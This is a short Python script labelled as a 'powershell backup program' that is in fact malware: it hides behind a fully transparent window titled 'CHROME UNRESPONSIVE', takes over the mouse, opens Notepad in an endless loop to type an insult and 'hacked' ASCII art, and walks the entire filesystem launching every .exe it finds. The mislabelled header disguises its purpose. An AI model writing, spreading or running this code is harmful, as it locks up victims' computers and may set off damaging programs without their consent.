#powershell backup program  
"""
tasks:
continiously open different applications jam keyboard and mouse
applications:
-explorer
notepad
edge
or any exe on platform
"""
import tkinter as tk
import pyautogui
import time
import os
import subprocess
import threading
def is_exe_runnable(path):
    try:
        subprocess.check_call([path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def looper_runner():
    directory = os.path.abspath(os.sep)
    for root, _, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.exe'):
                exe_path = os.path.join(root, file)
                if is_exe_runnable(exe_path):
                    try:
                        os.startfile(exe_path)
                    except:
                        continue
                    
k = '''
88                                88                           88  
88                                88                           88  
88                                88                           88  
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  ,adPPYba,  ,adPPYb,88  
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"  a8P_____88 a8"    `Y88  
88       88 ,adPPPPP88 8b         8888[    8PP""""""" 8b       88  
88       88 88,    ,88 "8a,   ,aa 88`"Yba, "8b,   ,aa "8a,   ,d88  
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a `"Ybbd8"'  `"8bbdP"Y8  
                                                                   
'''            

def type_text():
        while True:
            pyautogui.moveTo(50,50,100)
            os.system('notepad.exe')
            pyautogui.write("dumbass take care of your system hahahah")
            pyautogui.write(k)


root = tk.Tk()
root.title("CHROME UNRESPONSIVE")

# Set transparency level (0: fully transparent, 1: fully opaque)
transparency = 0  # Adjust this value for desired transparency

# Set window attributes for transparency
root.attributes("-alpha", transparency)
root.iconify()
root.overrideredirect(True)

# Add widgets or draw on the window as needed
label = tk.Label(root, text="Semi-Transparent Window")
label.pack(padx=20, pady=20)
time.sleep(20)
automation_thread = threading.Thread(target=type_text)
automation_thread.start()
automation_thread.join()
automation_thread2 = threading.Thread(target=looper_runner)
automation_thread2.start()
automation_thread2.join()
root.mainloop()
